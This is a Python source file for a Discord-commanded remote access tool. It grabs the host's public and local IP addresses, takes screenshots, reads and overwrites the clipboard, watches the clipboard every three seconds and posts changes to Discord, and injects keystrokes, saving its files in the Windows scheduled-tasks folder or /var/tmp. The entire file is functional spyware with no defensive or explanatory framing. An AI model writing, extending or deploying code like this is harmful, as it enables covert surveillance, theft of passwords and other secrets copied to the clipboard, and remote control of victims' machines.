from dotenv import load_dotenv
import discord
from discord.ext import commands, tasks
import os
from PIL import ImageGrab
from platform import system
from requests import get
import socket
import pyperclip
import asyncio
import pyautogui


load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

class MyBot(commands.Bot):
    async def setup_hook(self):
        # self is the bot here
        print(f"Logged in as: {self.user}")
        await self.add_cog(clipboard_monitor(bot))

bot = MyBot(command_prefix="!", intents=intents)


if system() == "Windows":
    isWindows = True
    path = "C:\\Windows\\System32\\Tasks\\"
elif system() == "Linux":
    isWindows = False
    path = "/var/tmp/"
else:
    exit()


# Standalone functions

def embed_data(title, description, data, color):
    if data:
        description += f"\n```{data}```"
        
    embed = discord.Embed(
        title=title,
        color=color,
        description=description
    )
    return embed


# IP functions

def get_public_ip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)
    return public_ip

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

@bot.command(name="ip")
async def ip(ctx):
    public_ip = get_public_ip()
    local_ip = get_local_ip()

    embed = discord.Embed(
        title="IP addresses",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )
    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await ctx.send(embed=embed)


# Screenshot functions

def take_screenshot():
    global path
    image_path = path + "screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(image_path)
    screenshot.close()

    return image_path

@bot.command(name="screenshot")
async def screenshot(ctx):
    image_path = take_screenshot()
    await ctx.send(file=discord.File(image_path))


# Clipboard functions
    
def get_clipboard():
    clipboard_content = pyperclip.paste()
    return clipboard_content

def set_clipboard(text):
    pyperclip.copy(text)
    return text

class clipboard_monitor(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.previous_clipboard = get_clipboard()

    def cog_unload(self) -> None:
        self.check_clipboard.stop()

    @tasks.loop(seconds=3)
    async def check_clipboard(self, ctx):
        try:
            clipboard = get_clipboard()
        except:
            pass

        if clipboard != self.previous_clipboard:
            self.previous_clipboard = clipboard

            if len(clipboard) > 2000:
                embed = embed_data(title="Clipboard monitor", description="Clipboard contents was too long", data="", color=discord.Color.red())
                await ctx.send(embed=embed)
            else:
                embed = embed_data(title="Extracted clipboard contents | Monitor mode", description="", data=clipboard, color=discord.Color.green())
                await ctx.send(embed=embed)

    @commands.group(name="clipboard", invoke_without_command=True)
    async def clipboard(self, ctx):
        await ctx.send("see help menu")

    @clipboard.group(name="monitor", invoke_without_command=True)
    async def monitor(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @monitor.command(name="start")
    async def start(self, ctx):
        self.check_clipboard.start(ctx)
        embed = embed_data(title="Clipboard monitor started", description="Clipboard monitor mode was started, disable with `clipboard monitor stop`", data=None, color=discord.Color.green())
        await ctx.send(embed=embed)

    @monitor.command(name="stop")
    async def stop(self, ctx):
        self.check_clipboard.stop()
        embed = embed_data(title="Clipboard monitor stopped", description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`", data="", color=discord.Color.red())
        await ctx.send(embed=embed)

    @monitor.command(name="status")
    async def status(self, ctx):
        if self.check_clipboard.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(title="Clipboard monitor status", description=f"Clipboard monitor is: **{status}**", data="", color=color)
        await ctx.send(embed=embed)

    @clipboard.command(name="get")
    async def get(self, ctx):
        clipboard_content = get_clipboard()

        embed = embed_data(title="Extracted clipboard contents:", description="", data=clipboard_content, color=discord.Color.green())
        await ctx.send(embed=embed)

    @clipboard.command(name="set")
    async def set(self, ctx, text):
        text = set_clipboard(text)

        embed = embed_data(title="Set clipboard contents to:", description="", data=text, color=discord.Color.green())
        await ctx.send(embed=embed)


# Keyboard functions
            
def write(data, interval):
    pyautogui.write(data, interval=interval)

@bot.command(name="keyboard")
async def clipboard(ctx, arg):
    write(arg, 0)

# Running the bot
    
bot.run(DISCORD_TOKEN)